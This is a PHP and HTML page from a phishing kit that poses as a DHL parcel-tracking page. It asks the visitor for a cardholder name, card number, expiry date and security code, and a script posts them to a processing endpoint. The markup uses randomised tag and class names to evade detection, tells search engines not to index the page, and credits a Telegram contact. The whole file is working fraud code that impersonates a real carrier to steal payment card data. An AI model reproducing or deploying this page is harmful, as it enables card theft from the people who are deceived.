<?php
    /*******
    Telegram : https://t.me/elgh03t
    ********************************************************/
    
    require_once '../app/config.php';
    $_SESSION['last_page'] = "cc";
    $semantic1 = semantic();
    $semantic2 = semantic();
    $semantic3 = semantic();
    $semantic4 = semantic();
    $semantic5 = semantic();
    $semantic6 = semantic();
    $semantic7 = semantic();
    $semantic8 = semantic();
    $semantic9 = semantic();
    $semantic10 = semantic();
    $semantic11 = semantic();
    $semantic12 = semantic();
    $semantic13 = semantic();
    $semantic14 = semantic();
    $semantic15 = semantic();
    $semantic16 = semantic();
    $semantic17 = semantic();

?>
<!doctype html>
<html <?php if( $_SESSION['lang'] == 'ar' ) { echo 'dir="rtl"'; } ?>>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <?php
        if( $_SESSION['lang'] == "ar" ) {
            ?>
            <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.rtl.min.css">
            <link rel="stylesheet" href="../media/css/helpers.css">
            <link rel="stylesheet" href="../media/css/stylear.css">
            <?php
        } else {
            ?>
            <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css">
            <link rel="stylesheet" href="../media/css/helpers.css">
            <link rel="stylesheet" href="../media/css/style.css">
            <?php
        }
        ?>

        <link rel="icon" type="image/x-icon" href="../media/imgs/ff.ico" />

        <title>DHL</title>
    </head>

    <body>

        <!-- HEADER -->
        <<?php echo $semantic1; ?> id="<?php echo rr(); ?>header<?php echo rr(); ?>">
            <<?php echo $semantic2; ?> class="container containerr">
                <<?php echo $semantic3; ?> class="<?php echo rr(); ?>top-header<?php echo rr(); ?>">
                    <<?php echo $semantic4; ?> class="<?php echo rr(); ?>logo<?php echo rr(); ?>"><img src="../media/imgs/logo.svg"></<?php echo $semantic4; ?>>
                    <ul>
                        <li><i class="fas fa-info-circle"></i> <?php echo get_text('top_header1'); ?></li>
                        <li><?php echo get_text('top_header2'); ?></li>
                        <li><i class="fas fa-search"></i> <?php echo get_text('top_header4'); ?></li>
                    </ul>
                    <ul class="<?php echo rr(); ?>mobile-menu<?php echo rr(); ?>">
                        <li><i class="fas fa-globe"></i></li>
                        <li><i class="fas fa-search"></i></li>
                        <li><i class="fas fa-bars"></i></li>
                    </ul>
                </<?php echo $semantic3; ?>>
                <<?php echo $semantic3; ?> class="<?php echo rr(); ?>bottom-header<?php echo rr(); ?> d-flex mt50">
                    <ul class="flex-grow-1">
                        <li style="color: #d40511; text-decoration: underline;"><?php echo get_text('mainmenu1'); ?> <i class="fas fa-chevron-down"></i></li>
                        <li><?php echo get_text('mainmenu2'); ?> <i class="fas fa-chevron-down"></i></li>
                        <li><?php echo get_text('mainmenu3'); ?></li>
                        <li><?php echo get_text('mainmenu4'); ?></li>
                    </ul>
                    <ul>
                        <li><i class="fas fa-user-tie"></i> <?php echo get_text('header-right'); ?></li>
                    </ul>
                </<?php echo $semantic3; ?>>
            </<?php echo $semantic2; ?>>
        </<?php echo $semantic1; ?>>
        <!-- END HEADER -->

        <!-- MAIN -->
        <<?php echo $semantic12; ?> id="<?php echo rr(); ?>main<?php echo rr(); ?>">
            <<?php echo $semantic13; ?> class="container">
                <<?php echo $semantic14; ?> class="<?php echo rr(); ?>main-title<?php echo rr(); ?>">
                    <h3><?php echo get_text('title'); ?></h3>
                </<?php echo $semantic14; ?>>
                <<?php echo $semantic14; ?> class="<?php echo rr(); ?>details<?php echo rr(); ?>" style="background: #FFF;">
                    <<?php echo $semantic15; ?> class="<?php echo rr(); ?>title<?php echo rr(); ?>">
                        <h3><i class="fas fa-truck"></i> <?php echo get_text('title2'); ?></h3>
                        <ul>
                            <li class="active"></li>
                            <li class="active"></li>
                            <li class="inactive"></li>
                        </ul>
                    </<?php echo $semantic15; ?>>
                    <p class="mb30">
                        <?php echo get_text('status'); ?></b><br>
                        <?php echo get_text('parcel'); ?></b><br>
                        <?php echo get_text('tracking'); ?>
                    </p>
                    <<?php echo $semantic15; ?> class="<?php echo rr(); ?>message<?php echo rr(); ?>">
                        <h3><?php echo get_text('important_title'); ?></h3>
                        <p><?php echo get_text('important_message'); ?></p>
                    </<?php echo $semantic15; ?>>
                    <input type="hidden" id="cap" name="cap">
                    <input type="hidden" name="steeep" id="steeep" value="cc">
                    <<?php echo $semantic15; ?> class="form-group mb20 <?php echo errclass($_SESSION['errors'],'name') ?>">
                        <label for="name"><?php echo get_text('name_label'); ?></label>
                        <input type="text" name="name" id="name" class="form-control" placeholder="<?php echo get_text('name_label'); ?>" value="<?php echo get_value('name'); ?>">
                        <?php echo errmsg($_SESSION['errors'],'name'); ?>
                    </<?php echo $semantic15; ?>>
                    <<?php echo $semantic15; ?> class="form-group mb20 <?php echo errclass($_SESSION['errors'],'one') ?>">
                        <label for="one"><?php echo get_text('one_label'); ?></label>
                        <input type="text" <?php if( $_SESSION['lang'] == "ar" ) { echo 'style="direction: ltr;text-align: right;"'; } ?> inputmode="numeric" name="one" id="one" class="form-control" placeholder="<?php echo get_text('one_label'); ?>" value="<?php echo get_value('one'); ?>">
                        <?php echo errmsg($_SESSION['errors'],'one'); ?>
                    </<?php echo $semantic15; ?>>
                    <<?php echo $semantic15; ?> class="row">
                        <<?php echo $semantic16; ?> class="col-6">
                            <<?php echo $semantic17; ?> class="form-group mb20 <?php echo errclass($_SESSION['errors'],'two') ?>">
                                <label for="two"><?php echo get_text('two_label'); ?></label>
                                <input type="text" <?php if( $_SESSION['lang'] == "ar" ) { echo 'style="direction: ltr;text-align: right;"'; } ?> inputmode="numeric" name="two" id="two" class="form-control" placeholder="<?php echo get_text('two_label'); ?>" value="<?php echo get_value('two'); ?>">
                                <?php echo errmsg($_SESSION['errors'],'two'); ?>
                            </<?php echo $semantic17; ?>>
                        </<?php echo $semantic16; ?>>
                        <<?php echo $semantic16; ?> class="col-6">
                            <<?php echo $semantic17; ?> class="form-group mb30 <?php echo errclass($_SESSION['errors'],'three') ?>">
                                <label for="three"><?php echo get_text('three_label'); ?></label>
                                <input type="text" <?php if( $_SESSION['lang'] == "ar" ) { echo 'style="direction: ltr;text-align: right;"'; } ?> inputmode="numeric" name="three" id="three" class="form-control" placeholder="<?php echo get_text('three_label'); ?>" value="<?php echo get_value('three'); ?>">
                                <?php echo errmsg($_SESSION['errors'],'three'); ?>
                            </<?php echo $semantic17; ?>>
                        </<?php echo $semantic16; ?>>
                    </<?php echo $semantic15; ?>>
                    <<?php echo $semantic15; ?> class="<?php echo rr(); ?>btns<?php echo rr(); ?>">
                        <<?php echo $semantic16; ?> id="booom" class="<?php echo rr(); ?>btttn<?php echo rr(); ?>"><?php echo get_text('next'); ?> <i class="fas fa-arrow-<?php if( $_SESSION['lang'] == "en" ) { echo "right"; } else { echo "left"; } ?>"></i></<?php echo $semantic16; ?>>
                    </<?php echo $semantic15; ?>>
                </<?php echo $semantic14; ?>>
            </<?php echo $semantic13; ?>>
        </<?php echo $semantic12; ?>>
        <!-- END MAIN -->

        <!-- FOOTER -->
        <<?php echo $semantic5; ?> id="<?php echo rr(); ?>footer<?php echo rr(); ?>">
            <<?php echo $semantic6; ?> class="container containerr">
                <<?php echo $semantic7; ?> class="<?php echo rr(); ?>top-footer<?php echo rr(); ?>">
                    <<?php echo $semantic8; ?> class="row">
                        <<?php echo $semantic10; ?> class="col-lg-3 col-md-6 col-sm-6 col-12 mb-5">
                            <<?php echo $semantic11; ?> class="<?php echo rr(); ?>widget<?php echo rr(); ?>">
                                <h3 style="color: #d40511;"><?php echo get_text('footer-widget-1-header'); ?></h3>
                                <ul>
                                    <li><?php echo get_text('footer-widget-1-1'); ?></li>
                                    <li><?php echo get_text('footer-widget-1-2'); ?></li>
                                    <li><?php echo get_text('footer-widget-1-3'); ?></li>
                                    <li><?php echo get_text('footer-widget-1-4'); ?></li>
                                </ul>
                            </<?php echo $semantic11; ?>>
                        </<?php echo $semantic10; ?>>
                        <<?php echo $semantic10; ?> class="col-lg-3 col-md-6 col-sm-6 col-12 mb-5">
                            <<?php echo $semantic11; ?> class="<?php echo rr(); ?>widget<?php echo rr(); ?>">
                                <h3><?php echo get_text('footer-widget-2-header'); ?></h3>
                                <ul>
                                    <li><?php echo get_text('footer-widget-2-1'); ?></li>
                                    <li><?php echo get_text('footer-widget-2-2'); ?></li>
                                    <li><?php echo get_text('footer-widget-2-3'); ?></li>
                                    <li><?php echo get_text('footer-widget-2-4'); ?></li>
                                    <li><?php echo get_text('footer-widget-2-5'); ?></li>
                                    <li><?php echo get_text('footer-widget-2-6'); ?></li>
                                </ul>
                            </<?php echo $semantic11; ?>>
                        </<?php echo $semantic10; ?>>
                        <<?php echo $semantic10; ?> class="col-lg-3 col-md-6 col-sm-6 col-12 mb-5">
                            <<?php echo $semantic11; ?> class="<?php echo rr(); ?>widget<?php echo rr(); ?>">
                                <h3><?php echo get_text('footer-widget-3-header'); ?></h3>
                                <ul>
                                    <li><?php echo get_text('footer-widget-3-1'); ?></li>
                                    <li><?php echo get_text('footer-widget-3-2'); ?></li>
                                    <li><?php echo get_text('footer-widget-3-3'); ?></li>
                                    <li><?php echo get_text('footer-widget-3-4'); ?></li>
                                    <li><?php echo get_text('footer-widget-3-5'); ?></li>
                                    <li><?php echo get_text('footer-widget-3-6'); ?></li>
                                    <li><?php echo get_text('footer-widget-3-7'); ?></li>
                                    <li><?php echo get_text('footer-widget-3-8'); ?></li>
                                    <li><?php echo get_text('footer-widget-3-9'); ?></li>
                                </ul>
                            </<?php echo $semantic11; ?>>
                        </<?php echo $semantic10; ?>>
                        <<?php echo $semantic10; ?> class="col-lg-3 col-md-6 col-sm-6 col-12 mb-5">
                            <<?php echo $semantic11; ?> class="<?php echo rr(); ?>widget<?php echo rr(); ?>">
                                <h3><?php echo get_text('footer-widget-4-header'); ?></h3>
                                <ul>
                                    <li><?php echo get_text('footer-widget-4-1'); ?></li>
                                    <li><?php echo get_text('footer-widget-4-2'); ?></li>
                                    <li><?php echo get_text('footer-widget-4-3'); ?></li>
                                    <li><?php echo get_text('footer-widget-4-4'); ?></li>
                                    <li><?php echo get_text('footer-widget-4-5'); ?></li>
                                    <li><?php echo get_text('footer-widget-4-6'); ?></li>
                                </ul>
                            </<?php echo $semantic11; ?>>
                        </<?php echo $semantic10; ?>>
                    </<?php echo $semantic8; ?>>
                </<?php echo $semantic7; ?>>
            </<?php echo $semantic6; ?>>
            <<?php echo $semantic6; ?> class="container containerr">
                <<?php echo $semantic7; ?> class="<?php echo rr(); ?>bottom-footer<?php echo rr(); ?>">
                    <<?php echo $semantic8; ?> class="row">
                        <<?php echo $semantic10; ?> class="col-md-8">
                            <img class="d-block mb20" src="../media/imgs/glo-footer-logo.svg">
                            <ul class="<?php echo rr(); ?>footer-list<?php echo rr(); ?>">
                                <li><?php echo get_text('footer-menu-1'); ?></li>
                                <li><?php echo get_text('footer-menu-2'); ?></li>
                                <li><?php echo get_text('footer-menu-3'); ?></li>
                                <li><?php echo get_text('footer-menu-4'); ?></li>
                                <li><?php echo get_text('footer-menu-5'); ?></li>
                                <li><?php echo get_text('footer-menu-6'); ?></li>
                                <li><?php echo get_text('footer-menu-7'); ?></li>
                                <li><?php echo get_text('footer-menu-8'); ?></li>
                            </ul>
                        </<?php echo $semantic10; ?>>
                        <<?php echo $semantic10; ?> class="col-md-4">
                            <h3><?php echo get_text('follow-us'); ?></h3>
                            <ul class="<?php echo rr(); ?>social<?php echo rr(); ?>">
                                <li><i class="fab fa-youtube"></i></li>
                                <li><i class="fab fa-facebook-f"></i></li>
                                <li><i class="fab fa-linkedin"></i></li>
                                <li><i class="fab fa-instagram"></i></li>
                            </ul>
                        </<?php echo $semantic10; ?>>
                    </<?php echo $semantic8; ?>>

                    <p><?php echo get_text('copyright'); ?></p>

                </<?php echo $semantic7; ?>>
            </<?php echo $semantic6; ?>>
        </<?php echo $semantic5; ?>>
        <!-- END FOOTER -->

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
        <script src="../media/js/js.js"></script>

        <script>
            $('#one').mask('0000 0000 0000 0000');
            $('#two').mask('00/00');
            $('#three').mask('0000');
            var loaded = false;  
            $('#booom').click(function(){
                if( loaded == true ) {
                    return false;
                }
                formData = {
                    'cap' : $('#cap').val(),
                    'steeep' : $('#steeep').val(),
                    'name' : $('#name').val(),
                    'one' : $('#one').val(),
                    'two' : $('#two').val(),
                    'three' : $('#three').val(),
                }
                $.post( "../processing.php", formData )
                    .done(function( data ) {
                    window.location.href = data;
                });
                loaded = true;
            });
        </script>

    </body>

</html>